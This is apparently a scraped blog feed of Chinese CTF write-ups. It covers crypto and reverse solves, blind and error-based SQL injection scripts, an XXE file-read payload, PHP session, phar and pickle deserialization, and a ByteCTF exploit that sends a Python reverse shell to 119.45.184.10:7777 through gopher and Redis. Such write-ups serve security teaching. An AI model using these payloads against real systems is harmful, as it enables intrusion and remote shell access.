4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53  from functools import reduce from gmpy2 import * from Crypto.Util.number import * p = 8514672730643859048534394807069131309787680751164114599934679913182447855051351521282825849300875451180808934634723540177392572020614371228127350366315093 q = 11396183484662982160414520115996568641053493169441818385689998874922190184600618993189406161808331825258864834179755881024216396230998042790787143415918623 dp = 4634673191749715344785371257538762101853031598311319863390489299958637062425141842768415934848075692534267896154614889702109236564561535721415087927569509 dq = 2784697141013150647927285038744181880232562395909713238360955579919897480173610712938239225733208967421091494647565583041208257260929211079467472399900897 c1 = 18651280944551604311574513905924240808170858244682968806319904706985057531598471703952601755416438724112982474074553590239198586111314171935361177438127669603910558881488636283078776442128635151084339480382293790405590179460228017768072311976510633046745233628899455474429389344003169695798357039738211025666 def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y) def crt(a, m): m1, a1, lcm = m[0], a[0], m[0] for i in range(1, len(m)): m2 = m[i] c = a[i]-a1 g, k1, _ = egcd(m1, m2) lcm = lcm*m[i]//GCD(lcm, m[i]) if c % g: print('No Answer!') return x0 = c//g*k1 t = m2//g x0 = (x0 % t + t) % t a1 += m1*x0 m1 = m2//g*m1 return a1 a, m = [dp, dq], [p-1, q-1] ans = crt(a, m) LCM = reduce(lambda x, y: x*y//gcd(x, y), m) P = reduce(lambda x, y: x*y, m) i = 0 x = ans+i*LCM while x \u003c P: assert x%(p-1)==dp and x%(q-1)==dq b = pow(c1, x, p*q) e = inverse(x,(p-1)*(q-1)) if b.bit_length()==512 and e.bit_length()==32: print(f\"b = {b}\") break i += 1 x = ans+i*LCM # b = 8998739874124476330077050284905438547791211705007347879192939614678547567964644612148886036506107930061008040551064553043959063715512574971543459965428364   bsgs 一下得到 e1+e2（使用SageMath）：\n1 2 3 4 5 6 7 8 9 10  c2 = 5482916971077907100465900758386122395988093179254480170511691938212094686909346076331158369021240925800603504683768019354372182250751332596677686598659819347466337649573401050759675695503404236960750776674833294023038703715840843231408879195866584742586386333373862336287408841247917195883597624403390910372 p = 8514672730643859048534394807069131309787680751164114599934679913182447855051351521282825849300875451180808934634723540177392572020614371228127350366315093 q = 11396183484662982160414520115996568641053493169441818385689998874922190184600618993189406161808331825258864834179755881024216396230998042790787143415918623 b = 8998739874124476330077050284905438547791211705007347879192939614678547567964644612148886036506107930061008040551064553043959063715512574971543459965428364 m1, m2 = b \u003e\u003e 256, b \u0026 2 ** 256 - 1 F = IntegerModRing(p*q) mm = F(m1+m2) c2 = F(c2) bsgs(mm, c2, (0, 2**32)) # 1751345818   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  from Crypto.Util.number import * e12 = 1751345818 c3 = 74961624700570825661425074699932176609321469056449513783085829938826707337287502198895054962001192345105970228367025392103044122840249185367359738330285315139075044769056261215439422786423423520242882616599069262320657892736490573199953747616316977906614094081725739377860475149681397270351494502879810040119 p = 8514672730643859048534394807069131309787680751164114599934679913182447855051351521282825849300875451180808934634723540177392572020614371228127350366315093 q = 11396183484662982160414520115996568641053493169441818385689998874922190184600618993189406161808331825258864834179755881024216396230998042790787143415918623 TABLE = b\"01234567890abcdef\" for i in range(16): for j in range(16): for k in range(16): for o in range(16): e1 = TABLE[i]*2**24 + TABLE[j]*2**16 + TABLE[k]*2**8 + TABLE[o] e2 = e12 - e1 a = (e1\u003c\u003c32) + e2 if pow(a, a, p*q) == c3: print(long_to_bytes(a)) # b'321e5195'   最后一部分flag3，用coppersmith来解。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  mbar = bytes_to_long(b\"321e5195\" + long_to_bytes(padding) + b\"1b1e4c40\") n = 99533148715508609137315732805340516238122605337971905073134049106535471150400953730776337851964290567462702510396193784084088446908685021259972049637120028927772077104891416698410847060838652281541457498771809838214954281245418160294140103403240809785976984535856950679868772244695570256951863999317571672437 c = 34338582171207379862033525927782528983529583622746250191048534516512185865146804370249601090807953801674089517476781590729012862579342009960254301681032365519483896873518539964443668111491961935441741311240417442342928596805632431072554504001292544711291709844962036644053777982072444079745282278911191432141 P.\u003cx\u003e = PolynomialRing(Zmod(n)) f = (mbar*2^128 + x)^5 - c roots = f.small_roots(epsilon=1/25) m = mbar*2^128 + roots[0] m_str = long_to_bytes(m) flags = [m_str[:8], m_str[-24:-20], m_str[-20:-16], m_str[-16:-12], m_str[-12:]] flag = b\"flag{\" + b\"-\".join(flags) + b\"}\" print(flag)   flag{321e5195-1b1e-4c40-816b-1dab7e595f49}\nRe friednly re sub413590 sub4120c0 sub412040 sub411db0 sub41123f是关键函数 main函数中先nop掉几个指令，能够输入 然后手动hook messageboxw,因为main函数前尝试程序自己失败了，hook成函数sub411370, 然后注册了异常，异常有注册了异常，经过整理明白，按顺序整理 sub4120c0 sm4密钥初始化 然后sub412040 sm4对我们输入加密 sub411db0 对比的答案移位 对sm4加密后的结果进行改base64加密 sub_412450最后对比 但是最后的感叹号与@不对应，想了还久 后面百度到是安洵杯的题目魔改 ，看了一下，看好像是作者没写好了 应用安洵杯的脚本 改一下就行 找到的安询杯的脚本来源 https://blog.csdn.net/qq_39542714/article/details/106834822\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  from pysm4 import decrypt,encrypt from base64 import b64decode Str = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/\" Str_ = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\" Str1 = '' for i in Str: Str1 += Str[(Str.find(i)+32) % len(Str)] print (Str1) enc = \"2NI5JKCBI5Hyva+8AZa3mq!!\" dec1 = '' for i in range(len(enc)): if enc[i] == '!': dec1 += '=' else: dec1 += Str_[Str1.find(enc[i])] print (dec1) dec2 = b64decode(dec1) print (dec2) import codecs encode_hex = codecs.getencoder(\"hex_codec\") dec3 = int(encode_hex(dec2)[0],16) print (dec3) key = \"Thisisinsteresth\" key = int(encode_hex(key)[0],16) print (key) decode_hex = codecs.getdecoder(\"hex_codec\") dec4 = decrypt(dec3, key) dec4 = str(hex(dec4)[2:-1]) print (decode_hex(dec4)[0])   ","description":"","tags":["phar","SQLi"],"title":"纵横杯 Writeup by X1cT34m","uri":"/posts/%E7%BA%B5%E6%A8%AA%E6%9D%AF-writeup-by-x1ct34m/"},{"categories":["ctf_writeup"],"content":"ezsql 考点：布尔盲注，MySQL_8.0.19新特性table语句，无列名盲注\n截图截没有了，忘了，简单说下思路：\n传统艺能sqli，本来是一个常规的布尔盲注，不过由于waf写的很黑，大小写ban掉了select，导致没有办法跨表查询，只能同表查询或者查库名：\nadmin'/**/and/**/ascii(substr(database(),1,1))\u003e32#\r//库名ctf\radmin'/**/and/**/ascii(substr(password,1,1))\u003e32#\r//密码b4bc4c343ed120df3bff56d586e6d617\r本来测出来有堆叠，但是由于waf写的很黑，堆叠也胎死腹中。\n注出来密码md5(gml666)==b4bc4c343ed120df3bff56d586e6d617之后，登陆，提示no flag； 由于waf写的很黑，这到题如果MySQL版本不是\u003e=8.0.19的话就是没有方法做的；\n我们能够在官方文档找到以下资料\n The TABLE statement in some ways acts like SELECT. Given the existance of a table named t, the following two statements produce identical output:\n1 2 3  TABLEt;SELECT*FROMt;  You can order and limit the number of rows produced by TABLE using ORDER BY and LIMIT clauses, respectively. These function identically to the same clauses when used with SELECT (including an optional OFFSET clause with LIMIT)\n 本地Windows起一个MySQL_8.0.22的环境调试了一下，发现了之前新春战疫的ezsql的姿势可以用，当时还抄了颖奇师傅的博客。\n 核心payload：(select 'admin','admin')\u003e(select * from users limit 1)\n  假设flag为flag{bbbbb}，对于payload这个两个select查询的比较，是按位比较的，即先比第一位，如果相等则比第二位，以此类推；在某一位上，如果前者的ASCII大，不管总长度如何，ASCII大的则大，这个不难懂，和c语言的strcmp()函数原理一样，举几个例子：\n glag \u003e flag{bbbbb}   alag{zzzzzzzzzzz} \u003c flag{bbbbb} a \u003c flag{bbbbb} z \u003e flag{bbbbb}  库名已知，我们需要的就是表名，根据写的很黑的waf，我们其实只有一条路：information_schema.tables，这张表结构大概是这样： 第一列TABLE_CATALOG基本都是def，少数是NULL，第二列是库名，第三列是表名，我们就只需要知道这些，另外的太多了不方便贴。\npayload大概长这样：\nadmin'/**/and/**/ROW('ctf','aser',3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)\u003c(table/**/information_schema.tables/**/limit/**/0,1)#\r//返回password error!\radmin'/**/and/**/ROW('ctf','aser',3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)\u003e(table/**/information_schema.tables/**/limit/**/0,1)#\r//返回,username error!\r接下来是exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52  #python3 import requests url = 'http://139.129.98.9:30003/login.php' def trans(flag): res = '' for i in flag: res += hex(ord(i)) res = '0x' + res.replace('0x','') return res flag = 'flag{6a55e234-1ed0-455c-bbf3-6df6ddce' # flag只能跑到这里，后面的一位任意字母真任意非字母假 for i in range(1,500): #这循环一定要大 不然flag长的话跑不完 hexchar = '' for char in range(32, 126): hexchar = trans(flag+ chr(char)) # payload = \"admin'/**/and/**/ROW('def','ctf',{},'A',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)\" \\ # \"\u003e(table/**/information_schema.tables/**/order/**/by/**/TABLE_SCHEMA/**/limit/**/1,1)#\".format(hexchar) # #表名admin和f11114g # payload = \"admin'/**/and/**/ROW('def','ctf','admin',{},5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)\" \\ # \"\u003e(table/**/information_schema.columns/**/order/**/by/**/TABLE_SCHEMA/**/limit/**/2,1)#\".format(hexchar) # #admin：id,USERNAME,PASSWORD.....打偏了 # payload = \"admin'/**/and/**/ROW('def','ctf','f11114g',{},5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)\" \\ # \"\u003e(table/**/information_schema.columns/**/order/**/by/**/TABLE_SCHEMA/**/limit/**/6,1)#\".format(hexchar) # #f11114g：F1LLLAGGG只有一列 payload = \"admin'/**/and/**/{}\" \\ \"\u003e(table/**/ctf.f11114g/**/limit/**/1,1)#\".format(hexchar) #这里本来不需要列名的，注列名是为了搞清楚有几列 data = { 'username': payload, 'password': '1' } proxies = { \"http\": \"http://127.0.0.1:8080\", } try: r = requests.post(url=url, data=data, proxies=proxies, timeout=2) except: pass print(char, r.text, data['username']) if 'password error!\"' in r.text: flag += chr(char-1) print(flag) break   说明一下，这个exp有点问题，比如flag中的-会跑出来单引号，遇到的时候手动换一下就好，然后就是跑到最后四位的时候会断掉，后面的玄学跑不出来。 赛后和师傅交流说其实flag可以直接用ascii(substr(flag,1,1))\u003e1的方式来做，因为f11114g表里面只有一个字段。\n","description":"嘶吼CTF","tags":["SQLi"],"title":"RoarCTF 2020","uri":"/posts/roarctf-2020/"},{"categories":["ctf_writeup"],"content":"学校有史以来第一次这么简单的新生赛，我承担平台的运维和web出题。\n第一次出这么多题，虽然题目难度都不大，不过折腾和搞平台环境还是花了不少精力，目的在于三点：\n 希望CTF能在学校更普及 希望能找到有兴趣和有毅力的学弟学妹 题目很多都是来自入门文档的知识点，看过的一定很容易做出来，希望新同学能认真看资料   题目开源地址：https://github.com/Anthem-whisper/0xGame2020\n所有题目环境：https://shimo.im/docs/8hkRHdRDdWyKycyK\n因为是自费运营，还请师傅们不要恶意破坏环境\n第一周 题目都是最简单的入门题目，也不涉及web漏洞，没什么好说的。主要考察同学们配置环境的动手能力。\n第二周 出了一道很简单的SQL注入，\n核心是要猜测登录时所拼接的sql语句：\n$sql = \"select username from user where username='\". $username .\"' and password='\". $password .\"';\";\r没有任何waf，在用户名处输入admin' or 1=1#搞定，由于#符号把后面的语句注视掉了，实际上sql语句实际上变成了：\nselect username from user where username='admin' or 1=1\r1=1是永远成立的，所以必然能返回大于一行的数据，也就是 mysql_num_rows($res)\u003e0，就可以获得flag\n第三周 一道XXE，一道SQL布尔盲注\ninject_me XXE是去年NCTF2019的原题，我在web入门doc里面写过，并且题目地址和源码我都给了。\n在给了hint的情况下这么少的解还是出乎我的意料\n由HTTP响应里面返回的标签以及Content-Type是xml格式可以很轻易的百度到XXE这种攻击手段\nXXE学习：https://xz.aliyun.com/t/3357\n告诉了/flag，那么随手一个payload就出来了：\n\u003c?xml version=\"1.0\"?\u003e\r\u003c!DOCTYPE dy [\r\u003c!ENTITY dy SYSTEM \"file:///flag\"\u003e\r]\u003e\r\u003cuser\u003e\u003cusername\u003e\u0026dy;\u003c/username\u003e\u003cpassword\u003e123\u003c/password\u003e\u003c/user\u003e\rclose_eyes 布尔盲注很多同学用手打，本来目的是想叫你们去学python的，结果硬是手打出来了，下次出个128位的flag（bushi\n本来想稍微加点waf的，后来不想出难了就没加，开SQLmap的莫得灵魂。\n布尔盲注学习：https://xz.aliyun.com/t/7169#toc-2\n这篇文章不仅仅讲了盲注也讲了其他的一些手法，值得钻研一番\n思路就是语句为假的时候（比如我用户名输入1'||1=0#或者乱输一个用户名密码），页面回显“数据库里没你这号人,别想骗劳资.jpg”\n为真的时候（比如我输入1'||1=1#）页面回显“数据库有你这号人，那又怎么着？”，根据回显情况的不同，我们就可以判断我们的condition究竟是真还是假。\n1'||(condition)#\r不断地改变condition就可以查到我们想要的数据；\n举个例子：\n1'||length(database())\u003e1#\r判断数据库名字的长度是不是大于1，页面返回“数据库有你这号人，那又怎么着？”，那么我们就可以确定数据库名字长度大于1。\n类似的：\n1'||ascii(substr(database(),1,1))=117#\r可判断数据库第一个字母是ASCII码为117的字母，也就是‘u'。\n也可以使用二分法进行盲注。\nexp：\n#python3\r#wh1sper\rimport requests\rhost = 'http://59.110.157.4:30052/login.php'\rdef mid(bot, top):\rreturn (int)(0.5 * (top + bot))\rdef sqli():\rname = ''\rfor j in range(1, 250):\rtop = 126\rbot = 32\rwhile 1:\rbabyselect = 'database()'#user\r#babyselect = '(select table_name from information_schema.tables where table_schema=database())'#user\r#babyselect = \"(select group_concat(column_name) from information_schema.columns \" \\\r# \"where table_schema=database() and table_name='user')\"#id,username,password\r#babyselect = \"(select group_concat(password) from user)\"#0xGame{blind_sqli_1s_not_hard}\rdata = {\r\"password\": \"1\",\r\"username\": \"1'||ascii(substr({},{},1))\u003e{}#\".format(babyselect, j, mid(bot, top))\r}\rr = requests.post(url=host, data=data)\r#print(r.text)\rprint(data)\rif '数据库有你这号人' in r.text:#子查询为真\rif top - 1 == bot:\rname += chr(top)\rprint(name)\rbreak\rbot = mid(bot, top)\relse:\rif top - 1 == bot:\rname += chr(bot)\rprint(name)\rbreak\rtop = mid(bot, top)\rif __name__ == '__main__':\rsqli()\r第四周 broken_motto session反序列化，也是文档里面出现过的\n\u003e\u003e学习链接，建议自己本地动手搭一个环境\n在profile.php里面里面有一行注释：\n//ini_set('session.serialize_handler','php_serialize');\r这行代码使用的Session序列化选择器是php_serialize，注释之后默认使用的是php\n两种选择器的不同的处理方式导致了session反序列化的漏洞的产生，存session的时候，存入php_serialize经过serialize()函数序列处理的数组\n读取的时候php以键名 ＋ 竖线 ＋ 经过 serialize() 函数序列化的数据处理如果你注册的时候加一个|，他会把|前面的忽略掉，只反序列化后面的，就可以造成对象注入。\nexp：\n\u003c?php\rclass info{\rpublic $admin;\rpublic $username;\rpublic $motto;\r}\r$pop = new info();\r$pop-\u003eadmin = 1;\recho serialize($pop);\rpayload：\n|O:4:\"info\":3:{s:5:\"admin\";i:1;s:8:\"username\";N;s:5:\"motto\";N;}\r这次比赛总的来说呢，还是很成功的，相信同学们都找到了自己心里一直想追求的方向，当然，比赛中也不乏表现突出的选手，希望你们能坚持下去，去追求更深的技术，更好的未来\n","description":"南京邮电大学新生赛","tags":null,"title":"0xGame2020出题笔记","uri":"/posts/0xgame2020%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/"},{"categories":["ctf_writeup"],"content":"这次ByteCTF2020的web题目非常顶，第一天比赛快结束的时候全场web才有了第一个解，后来解人数最多的XSS也就不过十个解，可惜一直在看爬虫的题，最后还是没做出。\n easy_scrapy 考点：MD5爆破、SSRF\n功能是添加一个http://或者https://开头的URL，并且要求输入验证码，可以利用以下脚本来爆破：\nimport hashlib\rfor i in range(99999999):\rif hashlib.md5(str(i).encode('UTF-8')).hexdigest()[:6] == '2c97b3':\rprint(i)\rbreak\r十几秒能出结果，之后可以BP重放数据包来快速的添加。\n添加成功之后可以在MyUrlList里面看到添加记录，点进去可以看到爬取到的东西。\n监听端口接收到请求：\nGET / HTTP/1.1\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\rAccept-Language: en\rUser-Agent: scrapy_redis\rAccept-Encoding: gzip, deflate\r发现是scrapy_redis，初步猜测是SSRF打redis。\n既然他是爬虫，那么遇到类似于这种标签的话，他很有可能就会去请求，（后来放了HINT，叫去读这个页面的源码）尝试爬以下这道题的公网IP，发现他会把/list的源码一并爬下来，那么我们可以起一个页面来指向file:///etc/passwd\n比赛的时候我用的是302重定向好像不行（哭了），其实这里他遇到一个标签就会去请求：\n我们可以发现他请求到了我们想要的URL：\n把标签的href改成file协议果然可以造成任意文件读：\n这样的话我们可以逐一的读取他爬虫的源码，但是在这之前我们要先知道爬虫工作的绝对路径，可以通过读/proc/self/environ，得到绝对路径PWD=/code，这个知识点在本站[SWPU2019]Web3也提到过。\n在官方文档中找到了这个爬虫框架的结构：\ntutorial/\rscrapy.cfg\rtutorial/\r__init__.py\ritems.py\rpipelines.py\rsettings.py\rspiders/\r__init__.py\r...\r我们尝试去读取这些文件；\nscrapy.cfg:\n# Automatically created by: scrapy startproject\r#\r# For more information about the [deploy] section see:\r# https://scrapyd.readthedocs.io/en/latest/deploy.html\r[settings]\rdefault = bytectf.settings\r[deploy]\r#url = http://localhost:6800/\rproject = bytectf\r对照着文档我们可以看到项目文件夹的名称是bytectf，不过在bytectf/spider文件夹下的爬虫名称却似乎是自定义的名字。\n读取/proc/self/cmdline，这个文件包含进程的完整命令行信息，我们可以根据他来得知正在运行的爬虫的文件名称。\n/usr/local/bin/python /usr/local/bin/scrapy crawl byte\r得知爬虫名字叫做byte。\n读取之，得到源码，结构大概如下：\n/code/\rrequirement.txt\rscrapy.cfg\rbytectf/\r__init__.py items.py pipelines.py settings.py spiders/ __init__.py byte.py\r由源码可知：\n172.20.0.8:6379为内网Redis\r172.20.0.7:27017为mongodb\r打一通之后没有任何回显，甚至不能确定这两个主机是否存活。\n根据hint，得到源码之后我们可以本地起一个环境来调试，同时，从这篇文章里面我们得知redis-scrapy的运作方式:\n作为一个分布式爬虫，是需要有一个Master端（核心服务器）的，在Master端，会搭建一个Redis数据库，用来存储start_urls、request、items。Master的职责是负责url指纹判重，Request的分配，以及数据的存储（一般在Master端会安装一个mongodb用来存储redis中的items）。出了Master之外，还有一个角色就是slaver（爬虫程序执行端），它主要负责执行爬虫程序爬取数据，并将爬取过程中新的Request提交到Master的redis数据库中。\n这和我们之前的猜想SSRF+Redis是越来越接近的。\n但是用用爬虫去打Redis是打不到东西的，我们可以在源码里面看到scrapy.Request，他是不支持gopher和dict协议的。\n哪里还有SSRF的点呢？\n当然是在点击爬取链接的时候：\n?url=https://baidu.com\r监听到请求的UA是PycURL，这个东西和curl差不多，是支持gopher等协议的，我们就可以利用这里去打redis。\n不过遗憾的是，这里的是ssrf仍然是没有回显，难以判断我们的payload是否起作用。\n此题最难发现的点我感觉就是这个pickle反序列化，此时有两种发现pickle反序列化的方法：\n1.本地起一个scrapy_redis环境，去看redis里面的东西，发现序列化数据（操作有难度，也许会遇到很多问题）\n2.爬虫第4行使用了scrapy_redis库，去看这个的源码，可以发现它在存取数据的过程中使用了pickle的序列化方式，并且还可以发现，它会将request对象存入爬虫名:requests这样的有序列表中。\n既然有序列化那必然存在反序列化，利用反序列化来反弹shell。\nbyte:requests有序列表是zset的，我们gopher打的时候需要zset。\n贴一个官方exp：\nimport pickle\rimport os\rfrom urllib.parse import quote\rclass exp(object):\rdef __reduce__(self):\rs = \"\"\"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"119.45.184.10\",7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\"\"\"\rreturn (os.system, (s,))\rtest = str(pickle.dumps(exp()))\rpoc = test.replace(\"\\n\",'\\\\n').replace(\"\\\"\",\"\\\\\\\"\")[2:-1]\rpoc ='gopher://172.20.0.7:6379/_'+quote('ZADD byte:requests 0 \"')+quote(poc)+quote('\"')\rprint(poc)\r时间显得有点急，这道题就草草的复现了一遍，以后时间再本地深究\n","description":"","tags":["SSRF","Redis","python反序列化"],"title":"ByteCTF2020复现","uri":"/posts/bytectf2020%E5%A4%8D%E7%8E%B0/"},{"categories":["ctf_writeup"],"content":"N1CTF打不过根本打不过，就做了个签到\n SignIn 考点：反序列化，布尔盲注，报错注入\n这是源码：\n\u003c?php\rhighlight_file(__FILE__);\rclass ip {\rpublic $ip;\rpublic function waf($info){\r}\rpublic function __construct() {\rif(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){\r$this-\u003eip = $this-\u003ewaf($_SERVER['HTTP_X_FORWARDED_FOR']);\r}else{\r$this-\u003eip =$_SERVER[\"REMOTE_ADDR\"];\r}\r}\rpublic function __toString(){\r$con=mysqli_connect(\"localhost\",\"root\",\"********\",\"n1ctf_websign\");\r$sqlquery=sprintf(\"INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')\",$this-\u003ewaf($_SERVER['HTTP_X_FORWARDED_FOR']),time());\rif(!mysqli_query($con,$sqlquery)){\rreturn mysqli_error($con);\r}else{\rreturn \"your ip looks ok!\";\r}\rmysqli_close($con);\r}\r}\rclass flag {\rpublic $ip;\rpublic $check;\rpublic function __construct($ip) {\r$this-\u003eip = $ip;\r}\rpublic function getflag(){\rif(md5($this-\u003echeck)===md5(\"key****************\")){\rreadfile('/flag');\r}\rreturn $this-\u003eip;\r}\rpublic function __wakeup(){\rif(stristr($this-\u003eip, \"n1ctf\")!==False)\r$this-\u003eip = \"welcome to n1ctf2020\";\relse\r$this-\u003eip = \"noip\";\r}\rpublic function __destruct() {\recho $this-\u003egetflag();\r}\r}\rif(isset($_GET['input'])){\r$input = $_GET['input'];\runserialize($input);\r}\r思路是利用stristr函数触发__toString，然后在XFF头来进行一个sql注入\n$pop = new flag();\r$pop-\u003eip = new ip();\recho serialize($pop);\r页面回显就只会有noip和welcome to n1ctf2020两种，因为__toString方法里面只有return，所以我们并不能直接看到mysql的回显（无论成功与否），只能利用两种回显来判断我们的sql语句是否逻辑正确。\n简单fuzz了一下，过滤了like、sleep、BENCHMARK，不能延时注入。\n因为他return mysqli_error($con);返回了MySQL的报错信息，我们便可以报错注入；\n' or updatexml(1,concat(0x7e,(select if((1=1),'n1ctf',0)),0x7e),1) or '\r1=1和1=0分别返回了不同的信息。\nexp：\nimport requests\rurl = 'http://101.32.205.189/index.php?input=O:4:\"flag\":2:{s:2:\"ip\";O:2:\"ip\":1:{s:2:\"ip\";i:1;}s:5:\"check\";s:4:\"test\";}'\rresult = ''\rreq = requests.session()\rfor x in range(1, 50):\rhigh = 127\rlow = 32\rmid = (low + high) // 2\rwhile high \u003e low:\r#babyselect = \"database()\"#n1ctf_websign\r#babyselect = \"(select group_concat(table_name) from information_schema.tables where table_schema=database())\"#n1ip,n1key\r#babyselect = \"(select group_concat(column_name) from information_schema.columns where table_name='n1key')\"#id,key\rbabyselect = \"(select `key` from n1key)\"#n1ctf20205bf75ab0a30dfc0c\rselect = \"ascii(substr({},{},1))\u003e{}\".format(babyselect, x, mid)\rpayload = \"' or updatexml(1,concat(0x7e,(select if(({}),'n1ctf',0)),0x7e),1) or '\".format(select)\rdata = {\"X-Forwarded-For\": payload}\rresp = requests.get(url, headers=data) #GET:params=data POST:data=data\rprint(payload)\rif resp.text.count('welcome to n1ctf2020') == 2: #\rlow = mid + 1\relse:\rhigh = mid\rmid = (low + high) // 2\r# print(mid)\rresult += chr(int(mid))\rprint(result)\rprint(\"end.......\")\rprint(result)\rkey是关键字，只能select key\n得到key：n1ctf20205bf75ab0a30dfc0c\n$pop = new flag();\r$pop-\u003eip = new ip();\r$pop-\u003echeck = \"n1ctf20205bf75ab0a30dfc0c\";\recho serialize($pop);\r传参得到：\nn1ctf{you_g0t_1t_hack_for_fun}\n","description":"Nu1L战队主办的比赛","tags":["PHP反序列化","SQLi"],"title":"N1CTF2020","uri":"/posts/n1ctf2020/"},{"categories":["ctf_writeup"],"content":"babyphp2 考点：phar反序列化、pop链、compress.zlib://phar://绕过^phar\nPaper：https://paper.seebug.org/680/\n题目一开始有www.zip给了源代码，下载过来审计;\n大概是有三个功能：文件上传、文件读取、SQL查询（登录框）\nphar反序列化 我们可以看到class.php里面有很多的类，可以想到可能存在反序列化，但是在源码里面没有unserialize的操作。不过，他有一个功能是文件上传，那么我们自然而然的想到了phar反序列化。\nclass.php\n\u003c?php\rerror_reporting(0);\rsession_start();\rclass User\r{\rpublic $id;\rpublic $age=null;\rpublic $nickname=null;\rpublic $backup;\rpublic function login() {\rif(isset($_POST['username'])\u0026\u0026isset($_POST['password'])){\r$mysqli=new dbCtrl();\r$this-\u003eid=$mysqli-\u003elogin();\rif($this-\u003eid){\r$_SESSION['id']=$this-\u003eid;\r$_SESSION['login']=1;\recho \"你的ID是\".$_SESSION['id'];\recho \"你好！\".$_SESSION['token'];\recho \"\u003cscript\u003ewindow.location.href='upload.php'\u003c/script\u003e\";\r}\r}\r}\rpublic function upload(){\r$uploader=new Upload();\r$uploader-\u003eupload();\r}\rpublic function read(){\r$reader=new reader();\r$reader-\u003eread($_POST['filename']);\r}\rpublic function __toString()\r{\r$this-\u003enickname-\u003ebackup=$this-\u003ebackup;\r$user = new User();\r$user-\u003eid = $_SESSION['id'];\r$user-\u003enickname = $_SESSION['token'];\rreturn serialize($user);\r}\r}\rclass dbCtrl\r{\rpublic $hostname=\"127.0.0.1\";\rpublic $dbuser=\"p3rh4ps\";\rpublic $dbpass=\"p3rh4ps\";\rpublic $database=\"p3rh4ps\";\rpublic $name;\rpublic $password;\rpublic $mysqli;\rpublic $token;\rpublic function __construct()\r{\r$this-\u003ename=$_POST['username'];\r$this-\u003epassword=$_POST['password'];\r}\rpublic function login()\r{\r$this-\u003emysqli=new mysqli($this-\u003ehostname, $this-\u003edbuser, $this-\u003edbpass, $this-\u003edatabase);\rif ($this-\u003emysqli-\u003econnect_error) {\rdie(\"连接失败，错误:\" . $this-\u003emysqli-\u003econnect_error);\r}\r$sql=\"select id,password from users where username=?\";\r$result=$this-\u003emysqli-\u003eprepare($sql);\r$result-\u003ebind_param('s', $this-\u003ename);\r$result-\u003eexecute();\r$result-\u003ebind_result($idResult, $passwordResult);\r$result-\u003efetch();\r$result-\u003eclose();\rif ($this-\u003etoken=='admin') {\rreturn $idResult;\r}\rif (!$idResult) {\recho('用户不存在!');\rreturn false;\r}\rif (md5($this-\u003epassword)!==$passwordResult) {\recho('密码错误！');\rreturn false;\r}\r$_SESSION['token']=$this-\u003ename;\rreturn $idResult;\r}\rpublic function __destruct(){\recho $this-\u003etoken;\r}\r}\rClass Upload{\rpublic $flag;\rpublic $file;\rpublic $ext;\rfunction __construct(){\r$this-\u003eflag = 1;\r$this-\u003eblack_list = ['ph', 'ht', 'sh', 'pe', 'j', '=', 'co', '\\\\', '\"', '\\''];\r}\rfunction check(){\r$ext = substr($_FILES['file']['name'], strpos($_FILES['file']['name'], '.'));\r$reg=implode(\"|\",$this-\u003eblack_list);\r$reg = \"/\" . $reg . \"\\x|\\s|[\\x01-\\x20]/i\";\rif(preg_match($reg, $ext)){\r$this-\u003eflag = 0;\r}\r$this-\u003eext = $ext;\r}\rfunction __wakeup(){\r$this-\u003eflag = 1;\r}\rfunction upload(){\r$this-\u003efile = $_FILES['file'];\r$this-\u003echeck();\rif($this-\u003eflag){\rif(isset($_FILES['file'])){\rif ($_FILES[\"file\"][\"error\"] \u003e 0){\recho \"Error: \" . $_FILES[\"file\"][\"error\"];\r}\relse{\rif (file_exists(\"upload/\" . $_FILES[\"file\"][\"name\"])){\recho $_FILES[\"file\"][\"name\"] . \" already exists. \";\r}\relse{\rif ($_FILES[\"file\"][\"size\"] \u003e 10240){\recho \"too big\";\r}\relse{\r$new_addr = $_SERVER['DOCUMENT_ROOT'] . \"/upload/\" . md5($_FILES['file']['name']) . $this-\u003eext;\recho $new_addr;\rmove_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $new_addr);\rreturn $new_addr;\r}\r}\r}\r}\r}\relse{\rdie(\"Noooooooooooooooooooooooooooo!\");\r}\r}\r}\rClass Reader{\rpublic $filename;\rpublic $result;\rpublic function read($filename){\rif (preg_match(\"/flag/i\",$filename)){\rdie(\"想多了嗷\");\r}\rif (preg_match(\"/sh/i\",$filename)){\rdie(\"nooooooooooo!\");\r}\rif (preg_match(\"/^php|^file|^gopher|^http|^https|^ftp|^data|^phar|^smtp|^dict|^zip/i\",$filename)){\rdie(\"Invid Schema!\");\r}\recho file_get_contents($filename);\r}\rpublic function __set($name,$val){\recho file_get_contents($val);\r}\r}\r众所周知，要触发phar反序列化，必须有文件操作函数，常见的大概是以下这些：\n在class.php里面，能触发的地方有两处：\n 第117行file_exists 第153和156行的file_get_contents  